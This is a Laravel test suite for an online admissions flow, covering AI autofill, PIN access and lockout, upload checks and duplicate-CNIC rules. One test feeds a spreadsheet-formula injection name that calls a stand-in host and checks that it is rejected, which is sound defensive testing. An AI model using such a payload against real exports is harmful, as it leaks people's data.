<?php

namespace Tests\Feature\Admissions;

use App\Models\AdmissionApplication;
use App\Services\Admissions\DocumentExtractor;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class ApplyFlowTest extends TestCase
{
    use AdmissionTestHelpers, RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('local');
        config(['services.anthropic.key' => null]);
        $this->setUpAdmissions();
    }

    private function startApplication(): AdmissionApplication
    {
        $this->post(route('apply.store'), [
            'program_id' => $this->bs->id, 'name' => 'Usman Tariq', 'cnic' => '3740512345671',
            'phone' => '03001234567', 'email' => 'usman@gmail.com', 'quota' => 'open',
        ])->assertRedirect();

        return AdmissionApplication::firstOrFail();
    }

    /** Fake AI that "reads" consistent values from every document. */
    private function fakeAi(): void
    {
        $this->app->instance(DocumentExtractor::class, new class implements DocumentExtractor
        {
            public function extract(string $type, string $binary, string $mime): array
            {
                $data = match ($type) {
                    'cnic' => ['name' => 'Usman Tariq', 'father_name' => 'Tariq Mehmood', 'cnic_number' => '37405-1234567-1', 'date_of_birth' => '2006-05-14', 'gender' => 'male'],
                    'father_cnic' => ['name' => 'Tariq Mehmood', 'father_name' => 'Ghulam Rasool', 'cnic_number' => '37405-7654321-3', 'date_of_birth' => '1975-03-01', 'gender' => 'male'],
                    'matric_dmc' => ['name' => 'Usman Tariq', 'father_name' => 'Tariq Mehmood', 'board' => 'BISE Rawalpindi', 'roll_no' => '412233', 'year' => 2022, 'group' => 'Science', 'obtained' => 935, 'total' => 1100, 'date_of_birth' => '2006-05-14'],
                    'inter_dmc' => ['name' => 'Usman Tariq', 'father_name' => 'Tariq Mehmood', 'board' => 'BISE Rawalpindi', 'roll_no' => '512233', 'year' => 2024, 'group' => 'ICS', 'obtained' => 880, 'total' => 1100, 'date_of_birth' => null],
                    'domicile' => ['name' => 'Usman Tariq', 'father_name' => 'Tariq Mehmood', 'district' => 'Rawalpindi'],
                    default => [],
                };

                return ['status' => 'done', 'data' => $data + ['document_type_matches' => true, 'confidence' => 94, 'issues' => []], 'confidence' => 94, 'error' => null, 'by' => 'fake-ai'];
            }
        });
    }

    public function test_full_online_application_with_ai_autofill(): void
    {
        $this->fakeAi();
        $app = $this->startApplication();
        $this->assertSame('draft', $app->status);
        $this->assertSame('37405-1234567-1', $app->cnic);

        // The PIN is stored hashed; the plain PIN lives only in this browser's session.
        $pin = session('apply_pins')[$app->tracking_no];
        $this->assertMatchesRegularExpression('/^\d{6}$/', $pin);
        $this->assertNotSame($pin, $app->fresh()->getRawOriginal('access_pin'));
        $this->get(route('apply.documents', $app->tracking_no))->assertOk()->assertSee($pin);

        // Review is blocked until required documents are uploaded
        $this->get(route('apply.review', $app->tracking_no))->assertRedirect(route('apply.documents', $app->tracking_no));

        foreach ($app->requiredDocumentTypes() as $type) {
            $file = UploadedFile::fake()->image("{$type}.jpg", 800, 600);
            $this->postJson(route('apply.upload', [$app->tracking_no, $type]), ['file' => $file])
                ->assertOk()->assertJsonPath('document.type', $type);
        }
        // dispatchAfterResponse runs synchronously in tests
        $app->refresh();
        $this->assertSame('Tariq Mehmood', $app->father_name);
        $this->assertSame(880, $app->inter_obtained);
        $this->assertContains('father_name', $app->autofilled_fields);
        $this->assertContains('inter_obtained', $app->autofilled_fields);

        $progress = $this->getJson(route('apply.progress', $app->tracking_no))->assertOk()->json();
        $this->assertFalse($progress['busy']);
        $this->assertTrue($progress['complete']);
        $this->assertSame('done', $progress['documents']['cnic']['status']);

        $this->get(route('apply.review', $app->tracking_no))->assertOk()->assertSee('From documents');

        $this->post(route('apply.submit', $app->tracking_no), [
            'program_id' => $this->bs->id, 'name' => 'Usman Tariq', 'father_name' => 'Tariq Mehmood', 'cnic' => '37405-1234567-1',
            'father_cnic' => '37405-7654321-3', 'date_of_birth' => '2006-05-14', 'gender' => 'male', 'religion' => 'Islam',
            'phone' => '0300-1234567', 'guardian_phone' => '0333-7654321', 'email' => 'usman@gmail.com',
            'address' => 'House 12, Street 4, Westridge', 'city' => 'Rawalpindi', 'domicile' => 'Rawalpindi', 'quota' => 'open',
            'matric_board' => 'BISE Rawalpindi', 'matric_roll_no' => '412233', 'matric_year' => 2022, 'matric_group' => 'Science', 'matric_obtained' => 935, 'matric_total' => 1100,
            'inter_board' => 'BISE Rawalpindi', 'inter_roll_no' => '512233', 'inter_year' => 2024, 'inter_group' => 'ICS', 'inter_obtained' => 880, 'inter_total' => 1100,
            'declaration' => '1',
        ])->assertRedirect(route('apply.done', $app->tracking_no));

        $app->refresh();
        // AI says "clear", but only an officer can mark it verified.
        $this->assertSame('under_review', $app->status);
        $this->assertSame('clear', $app->verification_status);
        $this->assertNotNull($app->merit_score);
        $this->get(route('apply.done', $app->tracking_no))->assertOk()->assertSee($app->tracking_no);
    }

    public function test_submit_rejects_blank_fields(): void
    {
        $app = $this->startApplication();
        foreach ($app->requiredDocumentTypes() as $type) {
            $this->post(route('apply.upload', [$app->tracking_no, $type]), ['file' => UploadedFile::fake()->image("{$type}.jpg", 400, 400)]);
        }
        $this->post(route('apply.submit', $app->tracking_no), ['program_id' => $this->bs->id])
            ->assertSessionHasErrors(['father_name', 'date_of_birth', 'father_cnic', 'address', 'matric_obtained', 'inter_obtained', 'declaration']);
        $this->assertSame('draft', $app->fresh()->status);
    }

    public function test_without_ai_key_documents_are_marked_for_manual_entry(): void
    {
        $app = $this->startApplication();
        $this->postJson(route('apply.upload', [$app->tracking_no, 'cnic']), ['file' => UploadedFile::fake()->image('cnic.jpg', 600, 400)])->assertOk();

        $doc = $app->documents()->where('type', 'cnic')->first();
        $this->assertSame('skipped', $doc->extraction_status);
        $this->assertNull($doc->extracted);
        $this->assertStringContainsString('not configured', $doc->extraction_error);
    }

    public function test_upload_validation_rejects_wrong_file_types(): void
    {
        $app = $this->startApplication();
        $this->postJson(route('apply.upload', [$app->tracking_no, 'cnic']), ['file' => UploadedFile::fake()->create('cnic.exe', 10, 'application/octet-stream')])
            ->assertStatus(422);
    }

    public function test_drafts_need_tracking_number_and_pin_from_another_browser(): void
    {
        $app = $this->startApplication();
        $pin = session('apply_pins')[$app->tracking_no];
        $this->flushSession();

        $this->get(route('apply.documents', $app->tracking_no))->assertRedirect();
        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin === '000000' ? '111111' : '000000'])->assertSessionHasErrors('pin');
        $this->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin])
            ->assertRedirect(route('apply.documents', $app->tracking_no));
        $this->get(route('apply.documents', $app->tracking_no))->assertOk();
    }

    public function test_pin_guessing_locks_the_tracking_number_whatever_the_ip(): void
    {
        $app = $this->startApplication();
        $pin = session('apply_pins')[$app->tracking_no];
        $this->flushSession();
        $wrong = $pin === '000000' ? '111111' : '000000';

        foreach (range(1, 5) as $i) {
            $this->withServerVariables(['REMOTE_ADDR' => "10.0.0.{$i}"])
                ->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $wrong])->assertSessionHasErrors('pin');
        }
        // Even the right PIN from a fresh IP is refused while locked.
        $this->withServerVariables(['REMOTE_ADDR' => '10.0.0.99'])
            ->post(route('apply.status.lookup'), ['tracking_no' => $app->tracking_no, 'pin' => $pin])
            ->assertSessionHasErrors(['pin' => 'Too many wrong PINs for this tracking number. Try again in 15 minutes, or contact the admissions office.']);
    }

    public function test_submitted_cnic_blocks_a_second_application_without_revealing_its_tracking_number(): void
    {
        $first = $this->startApplication();
        $first->update(['status' => 'submitted']);
        $this->flushSession();

        $this->post(route('apply.store'), [
            'program_id' => $this->bs->id, 'name' => 'Someone Else', 'cnic' => '37405-1234567-1',
            'phone' => '03001234567', 'email' => 'x@gmail.com', 'quota' => 'open',
        ])->assertSessionHasErrors('cnic');
        $this->assertStringNotContainsString($first->tracking_no, session('errors')->first('cnic'));
        $this->assertSame(1, AdmissionApplication::count());
    }

    public function test_a_draft_cannot_squat_someone_elses_cnic(): void
    {
        $this->startApplication();   // an attacker opens a draft with the victim's CNIC
        $this->flushSession();

        $this->post(route('apply.store'), [
            'program_id' => $this->bs->id, 'name' => 'Real Applicant', 'cnic' => '37405-1234567-1',
            'phone' => '03001234567', 'email' => 'real@gmail.com', 'quota' => 'open',
        ])->assertSessionHasNoErrors();
        $this->assertSame(2, AdmissionApplication::count());
    }

    public function test_names_with_spreadsheet_formulas_are_rejected(): void
    {
        $this->post(route('apply.store'), [
            'program_id' => $this->bs->id, 'name' => '=HYPERLINK("http://x.test/?"&C2,"Ali")', 'cnic' => '37405-1234567-1',
            'phone' => '03001234567', 'email' => 'x@gmail.com', 'quota' => 'open',
        ])->assertSessionHasErrors('name');
    }

    public function test_closed_cycle_shows_closed_page_and_blocks_new_applications(): void
    {
        $this->cycle->update(['closes_at' => now()->subDay()]);
        $this->get(route('apply.start'))->assertOk()->assertSee('Admissions are closed');
        $this->post(route('apply.store'), ['program_id' => $this->bs->id])->assertForbidden();
    }
}
